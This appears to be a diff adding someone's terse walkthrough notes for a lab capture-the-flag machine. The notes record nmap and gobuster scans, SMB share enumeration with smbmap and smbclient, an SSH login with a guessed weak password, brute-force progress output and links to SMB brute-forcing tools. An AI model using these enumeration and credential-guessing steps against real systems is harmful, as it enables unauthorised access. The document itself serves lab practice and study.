@@ -1,0 +1,74 @@
+nmap -sV -p- 192.168.0.32 --open
+
+22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL (unauthorized)
+6667/tcp open  irc         InspIRCd
+
+gobuster dir -u http://192.168.0.32/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+
+/index.html (Status: 200)
+/wordpress (Status: 301)
+/info.php (Status: 200)
+/test (Status: 301)
+/wp (Status: 301)
+/apache (Status: 301)
+/old (Status: 301)
+/javascript (Status: 301)
+/robots.txt (Status: 200)
+/phpmyadmin (Status: 301)
+
+Admin = webmaster@localhost 
+
+https://bestestredteam.com/2019/03/15/using-smbclient-to-enumerate-shares/
+
+smbmap -H 192.168.0.32
+
+Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        share$                                                  READ ONLY       Sumshare
+        IPC$                                                    NO ACCESS       IPC Service (Web server)
+
+smbclient --list 192.168.0.32
+
+smbclient //192.168.0.32/share$
+
+..                                  D        0  Mon Aug 14 07:34:47 2017
+  wordpress                           D        0  Thu Apr 16 18:56:58 2020
+  Backnode_files                      D        0  Mon Aug 14 07:08:26 2017
+  wp                                  D        0  Tue Aug 15 05:51:23 2017
+  deets.txt                           N      139  Mon Aug 14 07:20:05 2017
+  robots.txt                          N       92  Mon Aug 14 07:36:14 2017
+  todolist.txt                        N       79  Mon Aug 14 07:39:56 2017
+  apache                              D        0  Mon Aug 14 07:35:19 2017
+  index.html                          N    36072  Sun Aug  6 00:02:15 2017
+  info.php                            N       20  Tue Aug 15 05:55:19 2017
+  test                                D        0  Mon Aug 14 07:35:10 2017
+  old                                 D        0  Mon Aug 14 07:35:13 2017
+
+
+get wp-login.php
+
+ssh togie@192.168.0.32
+pass = 12345
+
+https://nvd.nist.gov/vuln/detail/CVE-1999-0519
+
+https://nvd.nist.gov/vuln/detail/CVE-1999-0520
+
+[STATUS] 240035785.86 tries/min, 1680250501 tries in 00:07h, 6002271999 to do in 00:26h, 1 active
+
+http://www.reydes.com/d/?q=Adivinar_Nombres_de_Usuarios_y_Contrasenas_sobre_SMB_utilizando_el_Script_smb_brute_de_Nmap
+
+https://underc0de.org/foro/herramientas-hacking/acccheck-fuerza-bruta-en-protocolos-smb/r
+
+https://github.com/m4ll0k/SMBrute
+
+data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAoCAYAAAC8cqlMAAAB5UlEQVR42u2ZPWvCUBSGM+UfFO3e3dLu/QN+oKj4EUXRQREEJYgoiCAu6qCogyDo7iJ21UUaKqEgCC4iiEMGB3UVgsnpTWj/wfVK2nvhGbKEPJyT996TMMzPGg6H5mKx+GgkyuWyeTQasb8OTDwef4tEIp8+n+/LYIjJZJJHQiwzm81M6OLDarWqNpsNjEYgEJCy2ewT0+/3TagighElNFAnQT6ft1ARKkJFqMgfFvF4PFpuEwFtdrcRqVarIIoirFYrIiyXSxiPx+B2u/GJBINBuF6vQHopigK1Wg2fCMdxcLlciIuoqgqNRgOfiN1uB3Qwg91uB8fjkQiHwwEmkwne1qLxS0VuKKJle71eh06nQ4Rmswk8z+MVcTqdsNlsQJZlotF7Pp8hk8ngE4lGo/qN7xG/vV4Pb0Xm8zlxkdPpBGgMx/+yJxIJKBQKRMjlcuBwOGhq/Q+RcDgMsViMCFrAuFwu/CKDwQC22y1IkkSE/X4PgiDo+xc2Ea0S9zjGa/Hb7Xbxifj9fj0K7yFSqVTwtlY6nYbpdKpPiSRYLBbQarX0PYymFhWhIlSEilCRW6GdyUqlkoVZr9dsKpXiOY6TtW+7BkNBz/7ebrcf9L+6Xq+XRYPMMyrTq5EIhUIvaAjTJb4BBNQ2yhnth0wAAAAASUVORK5CYII=
+
+#%21page-use-backnode
+
+Finally I can checkoff website development from my todolist
